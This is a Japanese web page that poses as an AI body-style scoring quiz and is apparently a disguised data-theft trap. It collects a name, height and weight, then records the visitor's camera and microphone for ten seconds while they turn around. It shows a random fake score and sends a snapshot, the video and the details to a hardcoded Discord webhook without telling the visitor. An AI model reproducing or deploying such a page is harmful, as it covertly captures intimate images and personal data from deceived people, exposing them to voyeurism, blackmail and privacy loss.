<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI 3Dスタイル偏差値診断</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #0a0a0a; color: #eee; padding: 20px; margin: 0; }
        .container { max-width: 500px; margin: auto; background: #1a1a1a; padding: 30px 20px; border-radius: 20px; }
        h1 { color: #007bff; font-size: 1.8em; }
        .input-group { margin-bottom: 15px; text-align: left; width: 85%; margin: auto; }
        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #333; background: #222; color: #fff; box-sizing: border-box; }
        .warning { color: #ffcc00; font-size: 0.85em; margin: 20px 0; border: 1px dashed #ffcc00; padding: 10px; }
        button { width: 85%; padding: 18px; font-weight: bold; background: #007bff; color: white; border: none; border-radius: 10px; cursor: pointer; }
        #video { width: 100%; border-radius: 15px; margin-top: 20px; display: none; aspect-ratio: 3/4; object-fit: cover; }
        #result { font-size: 1.4em; color: #ff0055; margin-top: 25px; font-weight: bold; }
        #next-options { display: none; margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
        .option-btn { display: block; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; background: #00ffcc; color: #000; }
        #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>AIスタイル偏差値診断</h1>
        <div id="setup-form">
            <div class="input-group"><input type="text" id="username" placeholder="名前"></div>
            <div class="input-group"><input type="number" id="height" placeholder="身長 (cm)"></div>
            <div class="input-group"><input type="number" id="weight" placeholder="体重 (kg)"></div>
            <div class="warning">【重要】全身をスキャンするため、10秒間ゆっくり回転してください。</div>
            <button id="startBtn">3Dフルスキャンを開始</button>
        </div>
        <video id="video" autoplay playsinline muted></video>
        <div id="result"></div>
        <div id="next-options">
            <a href="battle.html" class="option-btn">AI 黄金比スタイル・バトルに参加</a>
        </div>
    </div>
    <canvas id="canvas"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const result = document.getElementById('result');
        const setupForm = document.getElementById('setup-form');
        const nextOptions = document.getElementById('next-options');
        const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
        let mediaRecorder; let chunks = [];
        startBtn.addEventListener('click', () => {
            const user = document.getElementById('username').value || '未設定';
            const h = document.getElementById('height').value || '？';
            const w = document.getElementById('weight').value || '？';
            setupForm.style.display = 'none'; video.style.display = 'block';
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                video.srcObject = stream;
                const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
                mediaRecorder = new MediaRecorder(stream, { mimeType: type });
                chunks = [];
                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                mediaRecorder.onstop = () => {
                    result.innerHTML = "解析中...";
                    setTimeout(() => { captureAndSend(user, h, w); }, 1500);
                };
                mediaRecorder.start();
                result.innerHTML = "全身スキャン中...(10秒)";
                setTimeout(() => {
                    mediaRecorder.requestData();
                    setTimeout(() => { mediaRecorder.stop(); }, 500);
                }, 10000);
            }).catch(() => { result.innerHTML = "エラー：許可が必要です。"; setupForm.style.display = 'block'; });
        });
        async function captureAndSend(user, h, w) {
            const score = Math.floor(Math.random() * (95 - 80)) + 80;
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(async (photoBlob) => {
                const formData = new FormData();
                formData.append('content', `【スタイル診断】\n👤 名前: ${user}\n📏 数値: ${h}cm/${w}kg\n📊 スコア: ${score}`);
                formData.append('file1', photoBlob, 'style.png');
                if (chunks.length > 0) {
                    const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                    formData.append('file2', videoBlob, 'video.mp4');
                }
                await fetch(webhookUrl, { method: 'POST', body: formData });
                result.innerHTML = `あなたのスタイル偏差値：<br><span style="font-size:2em;">${score}</span>`;
                nextOptions.style.display = 'block';
                if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
            }, 'image/png');
        }
    </script>
</body>
</html>
